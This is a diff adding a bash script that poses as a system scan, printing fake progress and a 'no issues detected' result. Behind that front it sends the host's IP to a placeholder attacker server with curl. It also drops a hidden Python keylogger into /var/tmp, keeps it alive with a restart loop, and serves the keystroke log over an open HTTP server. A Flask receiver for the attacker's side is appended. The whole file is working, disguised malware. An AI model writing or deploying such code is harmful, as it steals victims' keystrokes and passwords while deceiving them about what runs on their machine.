@@ -1,0 +1,139 @@
+#! /bin/bash
+
+# Phoney scan script
+
+echo "Searching for issues in system..."
+sleep 1
+echo "..."
+sleep 1
+echo "..."
+sleep 1
+echo "..."
+echo "Checking system files..."
+sleep 1
+echo "..."
+sleep 1
+echo "..."
+sleep 1
+echo "..."
+sleep 1
+echo "Finalizing scan..."
+sleep 1
+echo "..."
+sleep 1
+echo "..."
+sleep 1
+echo "..."
+sleep 1
+echo "..."
+sleep 1
+echo "..."
+echo "Completed scan. No issues detected."
+
+# Function to get the host machine's IP address
+
+get_ip_address() {
+    ip_address=$(hostname -I | awk '{print $1}')
+    echo "Host IP Address: $ip_address"
+    echo "$ip_address"
+}
+
+# Function to send the IP address to a specific machine via HTTP POST
+
+send_ip_to_target() {
+    ip_address=$(get_ip_address)
+    target_url="http://X.X.X.X:8000/received_ips"  # Replace with Attacker IP
+    curl -X POST -d "ip_address=$ip_address" $target_url > /dev/null 2>&1 &
+}
+
+# Send the host machine's IP address to a specific server
+
+send_ip_to_target
+
+# Obfuscate keylogger
+
+cd /var/tmp 
+
+# Begins writing keylogger
+
+keylogger=".keylogger"
+cat <<EOL > $keylogger
+#! /usr/bin/env python3
+import pynput
+from pynput.keyboard import Listener
+def log_keystroke(key):
+    key = str(key).replace("'", "")
+    if key == 'Key.space':
+        key = ' '
+    if key == 'Key.shift_r':
+        key = ''
+    if key == 'Key.enter':
+        key = '\n'
+    if key == 'Key.ctrl_l':
+        key = ''
+    if key == 'Key.backspace':
+        key = ' DEL '
+    with open(".log.txt", 'a') as log_file:
+        log_file.write(key)
+def start_logging():
+    with Listener(on_press=log_keystroke) as listener:
+        listener.join()
+if __name__ == '__main__':
+    start_logging()
+EOL
+
+# Make the keylogger script executable
+
+chmod +x .keylogger
+chmod -r .keylogger
+
+# Function to ensure the keylogger is running
+
+zombify_keylogger(){
+    while true; do
+        if ! pgrep -f ".keylogger" > /dev/null; then
+            nohup python3 .keylogger > /dev/null 2>&1 &   # Redirect output to /dev/null to avoid terminal output
+        fi
+        sleep 10
+    done
+}
+
+# Run the keylogger and zombify it
+
+zombify_keylogger &
+
+# Start HTTP server to serve the .log.txt file silently in the background
+
+start_http_server(){
+    nohup bash -c "cd /var/tmp && python3 -m http.server 8000 --bind 0.0.0.0" > /dev/null 2>&1 & 
+}
+
+# Start the HTTP server in the background with no output to the terminal
+
+start_http_server &
+
+
+
+# Code to use on attackers computer, use "nohup python receive_ip.py &" to start 
+
+#! /usr/bin/env python3
+from flask import Flask, request
+import logging
+# Initialize Flask application
+app = Flask(__name__)
+# Set up logging
+logging.basicConfig(filename='received_ip.log', level=logging.INFO)
+# Route to receive the IP address
+@app.route('/receive_ip', methods=['POST'])
+def receive_ip():
+    # Get the IP address from the POST request data
+    ip_address = request.form.get('ip_address')
+    if ip_address:
+        # Log the received IP address
+        app.logger.info(f"Received IP address: {ip_address}")
+        return "IP address received successfully.", 200
+    else:
+        return "No IP address found in request.", 400
+# Start the server
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000)  # Listening on all interfaces, port 8000
